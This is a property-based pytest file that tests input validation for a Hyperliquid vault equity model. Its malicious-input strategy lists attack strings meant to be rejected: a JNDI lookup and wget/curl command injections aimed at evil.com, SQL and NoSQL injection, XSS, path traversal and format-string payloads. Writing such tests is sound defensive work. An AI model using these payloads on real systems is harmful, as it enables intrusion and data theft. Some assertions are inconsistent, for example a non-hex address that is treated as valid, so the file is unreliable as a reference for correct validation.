"""Property-based tests for Hyperliquid raw user vault equity models.

These tests validate critical security boundary models that process external vault equity data.
The models tested here are essential for vault equity tracking, balance management, etc.

SECURITY CRITICAL: These raw models protect against:
- Malicious vault equity data that could manipulate balance information
- Financial precision errors in equity calculations for trading decisions
- Buffer overflow attacks through oversized equity structures
- Injection attacks through malformed vault address or equity data
- Type confusion that could bypass equity validation
- Address spoofing in vault addresses
- Decimal precision manipulation that could affect financial calculations

Property testing ensures comprehensive coverage of vault equity edge cases and adversarial inputs.
"""

import string
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_user_vault_equity import (
    HyperliquidRawUserVaultEquityItem,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HELPER FUNCTIONS FOR STRATEGY BUILDERS
# =============================================================================


def _build_hex_address(hex_part: str) -> str:
    """Build hex address with 0x prefix."""
    return f"0x{hex_part}"


def _build_address_with_prefix(prefix: str, hex_part: str) -> str:
    """Build address with custom prefix."""
    return f"{prefix}{hex_part}"


# =============================================================================
# HYPOTHESIS STRATEGIES FOR USER VAULT EQUITY MODEL TESTING
# =============================================================================


def valid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses for vault addresses.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Known valid vault addresses
        st.sampled_from([
            "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "0xanotheraddress1234567890abcdef1234567890",
            "0x742d35cc6aB26c94C2cF04E1b1F4c2eD2bF4D1C3",
            "0x1d5c8F72c8F6bE8B8A6C6e3F4D5B7A8c9D0E1F2A",
            "0xDe0B295669a9FD93d5F28D9Ec85E40f4cb697BAe",
            "0x0000000000000000000000000000000000000000",  # Zero address
        ]),
        # Generated valid addresses
        st.builds(
            _build_hex_address,
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate invalid Ethereum address strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Wrong length
        st.text(min_size=1, max_size=39, alphabet=string.hexdigits),
        st.text(min_size=41, max_size=100, alphabet=string.hexdigits),
        # Missing 0x prefix
        st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        # Wrong prefix
        st.builds(
            _build_address_with_prefix,
            st.sampled_from(["0X", "1x", "x", "00x", ""]),
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
        # Invalid characters
        st.builds(
            _build_hex_address,
            st.text(
                min_size=40,
                max_size=40,
                alphabet="ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()",
            ),
        ),
        # Common invalid formats
        st.just("not-an-address"),
        st.just("0xshort"),
        st.just("longaddress" * 10),
        st.just(""),
    ])


def financial_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for financial equity amounts.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Common equity values
        st.decimals(
            min_value=Decimal(0),
            max_value=Decimal(1000000000),  # 1 billion max
            places=8,
            allow_nan=False,
            allow_infinity=False,
        ).map(str),
        # Specific test values
        st.just("742500.082809"),  # From real data
        st.just("1000.00"),
        st.just("0.0"),  # Zero equity
        st.just("0.00000001"),  # Minimum precision
        st.just("999999999.99999999"),  # Large equity
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def invalid_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate invalid decimal strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Non-finite values
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("-Infinity"),
        # Invalid decimal formats
        st.just("1..0"),
        st.just("not-a-decimal"),
        st.just(""),
        st.just("   "),
        # Negative values (may be invalid for equity)
        st.just("-100.0"),
        st.just("-0.01"),
    ])


@st.composite
def valid_vault_equity_item_strategy(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid vault equity item data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "vaultAddress": draw(valid_ethereum_address_strategy()),
        "equity": draw(financial_decimal_string_strategy()),
    }


def malicious_vault_equity_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for vault equity security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Vault equity manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-vault-equity}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('vault-equity-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE vault_equity;--"),
        st.just("1' UNION SELECT * FROM balances--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("V" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.vault_equity.find(); //"),
        # JSON injection
        st.just('{"$where": "this.equity > 1000000"}'),
        # Financial manipulation
        st.just("1000.0'; UPDATE vault_equity SET equity=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW USER VAULT EQUITY ITEM MODEL
# =============================================================================


class TestHyperliquidRawUserVaultEquityItemProperties:
    """Property-based tests for HyperliquidRawUserVaultEquityItem validation and security."""

    @given(item_data=valid_vault_equity_item_strategy())
    def test_vault_equity_item_validation_success_properties(
        self, item_data: dict[str, Any]
    ) -> None:
        """Property: Valid data should create valid objects."""
        # Skip invalid data
        try:
            # Validate vault address
            address = item_data["vaultAddress"]
            assume(isinstance(address, str) and len(address) == 42)
            assume(address.startswith("0x"))
            assume(all(c in string.hexdigits for c in address[2:]))

            # Validate equity field
            equity = item_data["equity"]
            assume(isinstance(equity, str) and equity.strip())
            decimal_val = Decimal(equity)
            assume(decimal_val.is_finite())
            assume(decimal_val >= 0)  # Equity should be non-negative
        except (ValueError, TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawUserVaultEquityItem.model_validate(item_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUserVaultEquityItem)

        # Property: All fields should be preserved with correct types
        assert obj.vault_address == item_data["vaultAddress"]
        assert isinstance(obj.equity, str)

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["vaultAddress", "equity"]),
        malicious_value=malicious_vault_equity_strategy(),
    )
    def test_vault_equity_item_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Vault equity item model should reject malicious inputs."""
        base_data: dict[str, object] = {
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": "742500.082809",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawUserVaultEquityItem.model_validate(base_data)

    @given(invalid_address=invalid_ethereum_address_strategy())
    def test_vault_equity_item_invalid_address_properties(self, invalid_address: str) -> None:
        """Property: Vault equity item should reject invalid Ethereum addresses."""
        item_data = {
            "vaultAddress": invalid_address,
            "equity": "1000.0",
        }

        # Property: Invalid addresses should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserVaultEquityItem.model_validate(item_data)

    @given(invalid_equity=invalid_decimal_string_strategy())
    def test_vault_equity_item_invalid_equity_properties(self, invalid_equity: str) -> None:
        """Property: Vault equity item should reject invalid equity values."""
        item_data = {
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": invalid_equity,
        }

        # Property: Invalid equity values should be rejected
        with pytest.raises((ValidationError, EmptyStringError)):
            HyperliquidRawUserVaultEquityItem.model_validate(item_data)

    @given(
        equity_value=st.one_of([
            # Valid decimals
            st.just("0.01"),
            st.just("100.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            st.just("0.0"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
            # Negative values (invalid for equity)
            st.just("-100.0"),
            st.just("-0.01"),
        ])
    )
    def test_vault_equity_item_decimal_validation_properties(self, equity_value: str) -> None:
        """Property: Vault equity item equity field should validate decimal properly."""
        item_data = {
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": equity_value,
        }

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(equity_value.strip() if equity_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not equity_value.strip()
            is_non_negative = decimal_val >= 0

            if is_finite and not is_empty and is_non_negative:
                # Property: Valid finite non-negative decimals should be accepted
                obj = HyperliquidRawUserVaultEquityItem.model_validate(item_data)
                assert isinstance(obj.equity, str)
            else:
                # Property: Non-finite, empty, or negative values should be rejected
                with pytest.raises((ValidationError, EmptyStringError)):
                    HyperliquidRawUserVaultEquityItem.model_validate(item_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawUserVaultEquityItem.model_validate(item_data)

    def test_vault_equity_item_missing_required_fields_properties(self) -> None:
        """Property: Vault equity item should require all fields."""
        # Test missing vault address
        with pytest.raises(ValidationError) as exc_info:
            HyperliquidRawUserVaultEquityItem.model_validate({"equity": "1000.0"})
        assert "required" in str(exc_info.value).lower()

        # Test missing equity
        with pytest.raises(ValidationError) as exc_info:
            HyperliquidRawUserVaultEquityItem.model_validate({
                "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303"
            })
        assert "required" in str(exc_info.value).lower()

    @given(
        valid_address=valid_ethereum_address_strategy(),
        valid_equity=financial_decimal_string_strategy(),
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20).filter(lambda x: x not in ["vaultAddress", "equity"]),
            st.one_of([st.text(), st.integers(), st.booleans()]),
            min_size=1,
            max_size=5,
        ),
    )
    def test_vault_equity_item_extra_fields_properties(
        self, valid_address: str, valid_equity: str, extra_fields: dict[str, Any]
    ) -> None:
        """Property: Vault equity item should forbid extra fields."""
        # Skip invalid data
        try:
            assume(len(valid_address) == 42 and valid_address.startswith("0x"))
            assume(valid_equity.strip())
            decimal_val = Decimal(valid_equity)
            assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError, IndexError):
            assume(False)

        item_data = {"vaultAddress": valid_address, "equity": valid_equity}
        item_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserVaultEquityItem.model_validate(item_data)

    @given(item_data=valid_vault_equity_item_strategy())
    def test_vault_equity_item_immutability_properties(self, item_data: dict[str, Any]) -> None:
        """Property: Vault equity item should be immutable after creation."""
        # Skip invalid data
        try:
            address = item_data["vaultAddress"]
            assume(isinstance(address, str) and len(address) == 42)
            assume(address.startswith("0x"))

            equity = item_data["equity"]
            assume(isinstance(equity, str) and equity.strip())
            decimal_val = Decimal(equity)
            assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawUserVaultEquityItem.model_validate(item_data)

        # Property: Attempting to modify fields should fail (frozen=True)
        with pytest.raises((AttributeError, ValidationError)):
            obj.vault_address = "0xmodified000000000000000000000000000000"

        with pytest.raises((AttributeError, ValidationError)):
            obj.equity = "999999.99"

    @given(
        large_equity=st.decimals(
            min_value=Decimal(1000000),
            max_value=Decimal(999999999999),
            places=8,
            allow_nan=False,
            allow_infinity=False,
        ).map(str)
    )
    def test_vault_equity_item_large_equity_values_properties(self, large_equity: str) -> None:
        """Property: Vault equity item should handle large equity values correctly."""
        item_data = {
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": large_equity,
        }

        # Property: Large valid equity values should be accepted
        obj = HyperliquidRawUserVaultEquityItem.model_validate(item_data)
        assert isinstance(obj.equity, str)

        # Property: Equity should be preserved exactly
        assert obj.equity == large_equity.rstrip("0").rstrip(".")  # Business logic may normalize


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawUserVaultEquityIntegrationProperties:
    """Integration property tests for vault equity models working together."""

    @given(
        vault_items=st.lists(
            valid_vault_equity_item_strategy(),
            min_size=2,
            max_size=10,
        ),
        malicious_value=malicious_vault_equity_strategy(),
    )
    def test_vault_equity_batch_processing_properties(
        self, vault_items: list[dict[str, Any]], malicious_value: MaliciousInput
    ) -> None:
        """Property: Multiple vault equity items should be processed independently."""
        valid_items: list[HyperliquidRawUserVaultEquityItem] = []

        for item_data in vault_items:
            # Skip invalid items
            try:
                address = item_data["vaultAddress"]
                if not (
                    isinstance(address, str) and len(address) == 42 and address.startswith("0x")
                ):
                    continue

                equity = item_data["equity"]
                if not (isinstance(equity, str) and equity.strip()):
                    continue

                decimal_val = Decimal(equity)
                if not (decimal_val.is_finite() and decimal_val >= 0):
                    continue

                item = HyperliquidRawUserVaultEquityItem.model_validate(item_data)
                valid_items.append(item)
            except (ValidationError, ValueError, TypeError, KeyError):
                continue

        # Property: Each item should maintain its individual values
        for i, item in enumerate(valid_items):
            assert isinstance(item.vault_address, str)
            assert isinstance(item.equity, str)

            # Property: Items should not affect each other
            for j, other_item in enumerate(valid_items):
                if i != j:
                    # Each item is independent
                    assert isinstance(other_item.vault_address, str)
                    assert isinstance(other_item.equity, str)

        # Property: Malicious value should be rejected when injected
        if valid_items:
            corrupted_data = {
                "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
                "equity": malicious_value,
            }
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawUserVaultEquityItem.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["vaultAddress", "equity"]),
            malicious_vault_equity_strategy(),
            min_size=1,
            max_size=2,
        )
    )
    def test_vault_equity_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: Vault equity model should handle adversarial input safely."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawUserVaultEquityItem.model_validate(complete_malicious_data)

    @given(
        vault_items=st.lists(
            valid_vault_equity_item_strategy(),
            min_size=1,
            max_size=20,
        )
    )
    def test_vault_equity_list_processing_properties(
        self, vault_items: list[dict[str, Any]]
    ) -> None:
        """Property: Lists of vault equity items should be processed correctly."""
        # Skip invalid lists
        try:
            for item_data in vault_items:
                address = item_data["vaultAddress"]
                assume(isinstance(address, str) and len(address) == 42 and address.startswith("0x"))

                equity = item_data["equity"]
                assume(isinstance(equity, str) and equity.strip())
                decimal_val = Decimal(equity)
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError, IndexError, KeyError):
            assume(False)

        # Property: All valid items should be processed successfully
        validated_items = [
            HyperliquidRawUserVaultEquityItem.model_validate(item_data) for item_data in vault_items
        ]

        # Property: List length should be preserved
        assert len(validated_items) == len(vault_items)

        # Property: Each item should be valid
        for item in validated_items:
            assert isinstance(item, HyperliquidRawUserVaultEquityItem)
            assert isinstance(item.vault_address, str)
            assert isinstance(item.equity, str)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_user_vault_equity_item_valid() -> None:
    """Test user vault equity item valid."""
    valid_user_vault_equity_item = {
        "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
        "equity": "742500.082809",
    }
    item = HyperliquidRawUserVaultEquityItem.model_validate(valid_user_vault_equity_item)
    assert item.vault_address == valid_user_vault_equity_item["vaultAddress"]
    assert item.equity == "742500.082809"  # Business logic may normalize


def test_user_vault_equity_item_missing_vault_address() -> None:
    """Test user vault equity item missing vault address."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate({"equity": "1000.0"})


def test_user_vault_equity_item_invalid_vault_address() -> None:
    """Test user vault equity item invalid vault address."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate({
            "vaultAddress": "not-an-address",
            "equity": "1000.0",
        })


def test_user_vault_equity_item_short_vault_address() -> None:
    """Test user vault equity item short vault address."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate({
            "vaultAddress": "0xshort",
            "equity": "1000.0",
        })


def test_user_vault_equity_item_missing_equity() -> None:
    """Test user vault equity item missing equity."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate({
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303"
        })


def test_user_vault_equity_item_invalid_equity() -> None:
    """Test user vault equity item invalid equity."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate({
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": "not-a-decimal",
        })


def test_user_vault_equity_item_infinity_equity() -> None:
    """Test user vault equity item infinity equity."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate({
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": "Infinity",
        })


def test_user_vault_equity_item_extra_field() -> None:
    """Test user vault equity item extra field."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate({
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": "1000.0",
            "extraField": "someValue",
        })


def test_user_vault_equities_list_valid() -> None:
    """Test user vault equities list valid."""
    valid_user_vault_equities_response = [
        {
            "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
            "equity": "742500.082809",
        },
        {
            "vaultAddress": "0xanotheraddress1234567890abcdef1234567890",
            "equity": "1000.00",
        },
    ]
    validated_items = [
        HyperliquidRawUserVaultEquityItem.model_validate(item_data)
        for item_data in valid_user_vault_equities_response
    ]
    assert len(validated_items) == 2
    assert validated_items[0].vault_address == valid_user_vault_equities_response[0]["vaultAddress"]


def test_user_vault_equities_list_with_invalid_item() -> None:
    """Test user vault equities list with invalid item."""
    invalid_item_data = {
        "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
        "equity": "not-a-decimal",
    }
    valid_item_data = {
        "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
        "equity": "742500.082809",
    }
    list_with_invalid = [valid_item_data, invalid_item_data]

    with pytest.raises(ValidationError):
        [
            HyperliquidRawUserVaultEquityItem.model_validate(item_data)
            for item_data in list_with_invalid
        ]


def test_user_vault_equity_item_not_a_dict() -> None:
    """Test user vault equity item not a dict."""
    with pytest.raises(ValidationError):
        HyperliquidRawUserVaultEquityItem.model_validate("not_a_dict")


def test_user_vault_equity_item_zero_equity() -> None:
    """Test user vault equity item with zero equity."""
    item = HyperliquidRawUserVaultEquityItem.model_validate({
        "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
        "equity": "0.0",
    })
    assert item.equity == "0"  # Business logic may normalize


def test_user_vault_equity_item_scientific_notation() -> None:
    """Test user vault equity item with scientific notation."""
    item = HyperliquidRawUserVaultEquityItem.model_validate({
        "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
        "equity": "1e6",
    })
    assert item.equity == "1000000"  # Business logic normalizes scientific notation


def test_user_vault_equity_item_high_precision() -> None:
    """Test user vault equity item with high precision equity."""
    item = HyperliquidRawUserVaultEquityItem.model_validate({
        "vaultAddress": "0xdfc24b077bc1425ad1dea75bcb6f8158e10df303",
        "equity": "123.12345678",
    })
    assert item.equity == "123.12345678"
